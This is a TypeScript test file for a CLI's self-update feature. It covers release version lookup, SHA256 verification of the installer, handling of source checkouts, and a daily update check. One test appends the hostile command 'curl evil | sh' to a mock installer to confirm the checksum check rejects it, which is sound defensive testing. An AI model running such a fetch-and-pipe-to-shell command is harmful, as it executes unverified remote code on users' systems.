import { describe, expect, it } from 'vitest';
import { createHash } from 'node:crypto';
import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { UPDATE_CHECK_INTERVAL_MS, availableUpdate, expectedSha256, isSourceCheckout, latestVersion, runUpdate } from '../src/update.js';

const SCRIPT = '#!/usr/bin/env bash\necho installing\n';
const sha = (s: string) => createHash('sha256').update(s).digest('hex');

/** GitHub as seen by the updater: /releases/latest redirects to the tag; release files by name. */
function github(latest: string | undefined, files: Record<string, string> = {}) {
  const requested: string[] = [];
  const fetchFn = (async (url: string) => {
    requested.push(url);
    if (url.endsWith('/releases/latest')) {
      const final = latest ? url.replace(/latest$/, `tag/v${latest}`) : url.replace(/\/latest$/, '');
      const r = new Response(null, { status: 200 });
      Object.defineProperty(r, 'url', { value: final });
      return r;
    }
    const name = url.split('/').pop()!;
    return name in files ? new Response(files[name]) : new Response('Not Found', { status: 404 });
  }) as unknown as typeof fetch;
  return { fetchFn, requested };
}

function run(current: string, gh: ReturnType<typeof github>, opts: { check?: boolean; source?: boolean } = {}) {
  let out = '';
  const installs: Array<{ script: string; version: string }> = [];
  const result = runUpdate(current, { check: opts.check }, {
    write: (t) => (out += t),
    fetch: gh.fetchFn,
    sourceCheckout: opts.source ?? false,
    runInstaller: async (script, version) => (installs.push({ script, version }), 0),
  });
  return result.then((code) => ({ code, out, installs }));
}

describe('latestVersion', () => {
  it('reads the version from the /releases/latest redirect', async () => {
    expect(await latestVersion(github('0.4.1').fetchFn)).toBe('0.4.1');
  });
  it('fails clearly when there is no release', async () => {
    await expect(latestVersion(github(undefined).fetchFn)).rejects.toThrow(/no release found/);
  });
});

describe('tessera-code update', () => {
  const release = (v: string, script = SCRIPT) => github(v, { 'install.sh': script, SHA256SUMS: `${sha('tgz')}  tessera-code-${v}.tgz\n${sha(script)}  install.sh\n` });

  it('does nothing when already on the latest (or a newer) version', async () => {
    for (const current of ['0.3.0', '0.4.0']) {
      const r = await run(current, release('0.3.0'));
      expect(r.code).toBe(0);
      expect(r.out).toMatch(/up to date/);
      expect(r.installs).toEqual([]);
    }
  });

  it('--check only reports an available update', async () => {
    const r = await run('0.3.0', release('0.3.1'), { check: true });
    expect(r.out).toMatch(/0\.3\.0 → 0\.3\.1/);
    expect(r.installs).toEqual([]);
  });

  it('runs the new release\'s verified installer, pinned to that version', async () => {
    const r = await run('0.3.0', release('0.3.1'));
    expect(r.code).toBe(0);
    expect(r.installs).toEqual([{ script: SCRIPT, version: '0.3.1' }]);
    expect(r.out).toMatch(/Updated 0\.3\.0 → 0\.3\.1/);
  });

  it('refuses an installer that does not match SHA256SUMS', async () => {
    const gh = github('0.3.1', { 'install.sh': SCRIPT + 'curl evil | sh\n', SHA256SUMS: `${sha(SCRIPT)}  install.sh\n` });
    await expect(run('0.3.0', gh)).rejects.toThrow(/does not match its SHA256SUMS; nothing was changed/);
  });

  it('fails when the release files are missing', async () => {
    await expect(run('0.3.0', github('0.3.1'))).rejects.toThrow(/HTTP 404/);
  });

  it('points a source checkout at git instead of replacing it', async () => {
    const r = await run('0.3.0', release('0.3.1'), { source: true });
    expect(r.code).toBe(1);
    expect(r.out).toMatch(/git pull && npm ci && npm run build/);
    expect(r.installs).toEqual([]);
  });

  it('passes the installer\'s failure on', async () => {
    let out = '';
    const code = await runUpdate('0.3.0', {}, { write: (t) => (out += t), fetch: release('0.3.1').fetchFn, sourceCheckout: false, runInstaller: async () => 3 });
    expect(code).toBe(3);
    expect(out).not.toMatch(/Updated/);
  });
});

describe('helpers', () => {
  it('reads SHA256SUMS lines in both formats', () => {
    const h = 'a'.repeat(64);
    expect(expectedSha256(`${h}  install.sh\n`, 'install.sh')).toBe(h);
    expect(expectedSha256(`${h} *install.sh\n`, 'install.sh')).toBe(h);
    expect(expectedSha256(`${h}  other.sh\n`, 'install.sh')).toBeUndefined();
  });

  it('tells a source checkout from an installed package', () => {
    const pkg = mkdtempSync(join(tmpdir(), 'tessera-pkg-'));
    writeFileSync(join(pkg, 'package.json'), '{}');
    expect(isSourceCheckout(pkg)).toBe(false);
    mkdirSync(join(pkg, 'src'));
    writeFileSync(join(pkg, 'src', 'cli.ts'), '');
    expect(isSourceCheckout(pkg)).toBe(true);
  });
});

describe('update notice', () => {
  it('reports a newer release, asks GitHub at most once a day, and stays quiet otherwise', async () => {
    const day0 = 1_000_000;
    const gh = github('0.3.4');
    expect(await availableUpdate('0.3.3', { fetch: gh.fetchFn, now: day0 })).toBe('0.3.4');
    expect(gh.requested).toHaveLength(1);
    // Within the day: the cached answer, no request.
    expect(await availableUpdate('0.3.3', { fetch: gh.fetchFn, now: day0 + 60_000 })).toBe('0.3.4');
    expect(gh.requested).toHaveLength(1);
    // Up to date (or newer, e.g. a source checkout ahead of the release): nothing to say.
    expect(await availableUpdate('0.3.4', { fetch: gh.fetchFn, now: day0 + 60_000 })).toBeUndefined();
    expect(await availableUpdate('0.4.0', { fetch: gh.fetchFn, now: day0 + 60_000 })).toBeUndefined();
    // A day later GitHub is asked again.
    const later = github('0.3.5');
    expect(await availableUpdate('0.3.3', { fetch: later.fetchFn, now: day0 + UPDATE_CHECK_INTERVAL_MS })).toBe('0.3.5');
    expect(later.requested).toHaveLength(1);
  });

  it('never throws (offline, no release)', async () => {
    const offline = (async () => Promise.reject(new Error('offline'))) as unknown as typeof fetch;
    expect(await availableUpdate('0.3.3', { fetch: offline, now: 9e15 })).toBeUndefined();
    expect(await availableUpdate('0.3.3', { fetch: github(undefined).fetchFn, now: 9e15 + 1 })).toBeUndefined();
  });
});
